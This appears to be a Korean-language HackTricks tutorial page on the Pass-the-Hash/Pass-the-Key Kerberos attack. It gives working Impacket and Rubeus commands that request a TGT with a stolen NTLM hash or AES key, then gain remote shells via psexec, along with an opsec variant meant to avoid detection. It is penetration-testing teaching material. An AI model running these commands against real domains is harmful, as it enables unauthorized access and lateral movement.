# 해시/키 전달하기

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요!</summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 홍보**하고 싶으신가요? 혹은 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요, 저희의 독점 [**NFT 컬렉션**](https://opensea.io/collection/the-peass-family)
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f)이나 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**를 팔로우**하세요.
* **해킹 요령을 공유하고 싶다면 [hacktricks repo](https://github.com/carlospolop/hacktricks) 및 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**로 PR을 제출하세요.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## 해시/키 전달하기 (PTK)

**해시/키 전달하기 (PTK)** 공격은 전통적인 NTLM 프로토콜이 제한되어 있고 Kerberos 인증이 우선하는 환경을 대상으로 설계되었습니다. 이 공격은 사용자의 NTLM 해시 또는 AES 키를 활용하여 Kerberos 티켓을 요청하여 네트워크 내의 리소스에 무단 액세스할 수 있게 합니다.

이 공격을 실행하기 위해 초기 단계는 대상 사용자 계정의 NTLM 해시 또는 비밀번호를 획득하는 것입니다. 이 정보를 확보한 후 계정에 대한 Ticket Granting Ticket (TGT)를 얻어 공격자가 사용자가 권한을 가진 서비스나 기기에 액세스할 수 있게 합니다.

이 프로세스는 다음 명령으로 시작할 수 있습니다:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256이 필요한 시나리오의 경우, `-aesKey [AES key]` 옵션을 사용할 수 있습니다. 또한 획득한 티켓은 smbexec.py 또는 wmiexec.py와 같은 다양한 도구와 함께 사용될 수 있어 공격 범위를 확대할 수 있습니다.

_PyAsn1Error_ 또는 _KDC cannot find the name_과 같은 문제는 일반적으로 Impacket 라이브러리를 업데이트하거나 IP 주소 대신 호스트 이름을 사용하여 Kerberos KDC와의 호환성을 보장함으로써 해결됩니다.

Rubeus.exe를 사용한 대체 명령 시퀀스는 이 기술의 다른 측면을 보여줍니다:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
이 방법은 **Pass the Key** 방식을 반영하며, 인증 목적으로 티켓을 직접 사용하고 장악하는 데 초점을 맞춥니다. TGT 요청의 시작은 기본적으로 RC4-HMAC 사용을 나타내는 `4768: A Kerberos authentication ticket (TGT) was requested` 이벤트를 트리거합니다. 그러나 현대의 Windows 시스템은 AES256을 선호합니다.

운영 보안을 준수하고 AES256을 사용하려면 다음 명령을 적용할 수 있습니다:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## 참고 자료

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)를 통해 제로부터 영웅이 되기까지 AWS 해킹을 배우세요</strong></summary>

* **사이버 보안 회사에서 일하시나요? 귀하의 회사가 HackTricks에서 광고되길 원하시나요? 또는 PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 저희의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* [**공식 PEASS & HackTricks 스왹**](https://peass.creator-spring.com)을 받으세요
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**를 팔로우하세요**.
* **[hacktricks repo](https://github.com/carlospolop/hacktricks) 및 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)에 PR을 제출하여 해킹 트릭을 공유하세요**.

</details>
